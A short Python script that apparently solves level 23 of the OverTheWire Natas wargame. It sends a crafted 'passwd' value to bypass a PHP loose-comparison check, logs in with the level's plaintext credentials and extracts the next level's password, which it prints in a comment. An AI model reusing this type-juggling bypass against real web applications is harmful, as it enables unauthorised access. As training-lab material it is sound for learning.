import requests
import re

url = 'http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou'
auth = requests.auth.HTTPBasicAuth('natas23','D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE')
r = requests.post(url, auth=auth)

pwd = re.findall('natas24 Password: (.*)</pre>', r.text)[0]
print(pwd) # OsRmXFguozKpTZZ5X14zNO43379LZveg

